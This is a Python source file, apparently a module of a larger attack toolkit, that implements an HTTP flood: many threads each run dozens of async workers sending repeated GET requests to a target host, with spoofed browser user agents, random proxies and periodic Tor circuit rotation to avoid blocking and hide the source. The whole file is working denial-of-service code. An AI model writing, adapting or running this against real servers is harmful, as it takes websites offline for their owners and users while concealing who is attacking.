import asyncio
import aiohttp
import random
import threading
import time
from .base import AttackBase

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

class HTTPAsyncFlood(AttackBase):
    def __init__(self, *args, path="/", concurrency_multiplier=20, tor_rotate_interval=50, **kwargs):
        super().__init__(*args, **kwargs)
        self.path = path
        self.url = f"http://{self.target}:{self.port}{path}"
        self.concurrency_per_thread = concurrency_multiplier
        self.tor_rotate_interval = tor_rotate_interval

    def start(self):
        self.stats["start_time"] = time.time()
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self._run_event_loop)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=2)
        self.stats["end_time"] = time.time()
        return self.stats

    def _run_event_loop(self):
        asyncio.run(self._worker_pool())

    async def _worker_pool(self):
        connector = aiohttp.TCPConnector(
            limit=50,
            limit_per_host=30,
            ttl_dns_cache=300,
            force_close=False
        )
        timeout = aiohttp.ClientTimeout(total=3, sock_connect=2)
        proxy = None
        if self.proxy_manager:
            p = self.proxy_manager.get_random()
            if p:
                proxy = p
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": random.choice(USER_AGENTS)},
        ) as session:
            tasks = []
            for _ in range(self.concurrency_per_thread):
                tasks.append(asyncio.create_task(self._attacker(session, proxy)))
            tasks.append(asyncio.create_task(self._stop_waiter()))
            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            for task in pending:
                task.cancel()

    async def _stop_waiter(self):
        while not self.stop_event.is_set():
            await asyncio.sleep(0.1)

    async def _attacker(self, session: aiohttp.ClientSession, proxy: str = None):
        if self.rps_limit > 0:
            total_tasks = self.thread_count * self.concurrency_per_thread
            delay = total_tasks / self.rps_limit
        else:
            delay = 0
        last_send = time.time()
        request_count = 0

        while not self.stop_event.is_set():
            if delay > 0:
                elapsed = time.time() - last_send
                if elapsed < delay:
                    await asyncio.sleep(delay - elapsed)
                last_send = time.time()

            # Rotate Tor circuit if using local Tor proxy
            if (self.proxy_manager and proxy and 
                proxy.startswith("socks5://127.0.0.1") and 
                request_count > 0 and request_count % self.tor_rotate_interval == 0):
                await asyncio.to_thread(self.proxy_manager.rotate_tor_circuit)
                await asyncio.sleep(1)  # Allow circuit to establish

            try:
                async with session.get(self.url, proxy=proxy) as resp:
                    await resp.content.read(1)
                with self.lock:
                    self.stats["requests"] += 1
                    self.stats["bytes_sent"] += 200
                request_count += 1
            except Exception:
                with self.lock:
                    self.stats["errors"] += 1
                await asyncio.sleep(0.001)

    def worker(self) -> int:
        return 0